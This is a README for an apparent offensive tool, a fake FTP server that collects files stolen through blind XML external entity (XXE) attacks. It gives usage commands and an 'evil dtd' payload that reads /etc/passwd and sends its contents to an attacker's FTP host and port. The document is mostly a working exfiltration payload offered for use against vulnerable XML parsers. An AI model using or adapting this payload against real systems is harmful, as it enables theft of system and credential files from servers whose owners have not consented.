# Fake-FTP-Server
This is a fake ftp server to receive data when you exploit blind XXE vulnerabilities to read files.

### Usage:
```
python fake-ftp-server.py PORT output-file

python fake-ftp-server.py 1234 res.txt
```
The fake server will run on PORT.        
The program may use another port for auxiliary (default is 63568), if it is occupied, please change it by yourself!

The evil dtd is like:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'ftp://IP:PORT/%file;'>">
```
![example](./images/example.png)